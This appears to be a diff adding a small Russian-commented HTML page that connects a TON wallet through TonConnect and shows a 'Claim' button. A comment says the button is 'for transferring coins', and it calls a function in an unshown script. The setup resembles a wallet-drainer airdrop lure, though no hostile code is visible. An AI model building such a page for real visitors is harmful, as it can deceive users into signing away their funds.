@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TonConnect</title>
+
+    <!-- Подключение библиотек TonConnect UI и SDK -->
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    
+    <!-- Добавим стиль для фона и кнопок -->
+    <style>
+        body {
+            background-color: #001f3d; /* Темно-синий фон */
+            color: white; /* Белый текст */
+            font-family: Arial, sans-serif; /* Шрифт */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh; /* 100% высоты экрана */
+            margin: 0;
+        }
+
+        #ton-connect {
+            margin-bottom: 20px; /* Расстояние между кнопками */
+        }
+
+        button {
+            background-color: #0073e6; /* Цвет кнопки */
+            color: white; /* Белый цвет текста */
+            font-size: 24px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #005bb5; /* Более темный оттенок при наведении */
+        }
+
+        /* Стили для кнопки Claim */
+        .claim-button {
+            margin-top: 30px; /* Расстояние сверху */
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Кнопка для подключения кошелька -->
+    <div id="ton-connect"></div>
+    
+    <!-- Кнопка "Claim" для трансфера монет -->
+    <button onclick="didtrans();" class="claim-button">Claim</button>
+
+    <!-- Подключаем ваш JavaScript файл -->
+    <script src="tonsdk.js"></script>
+
+</body>
+</html>
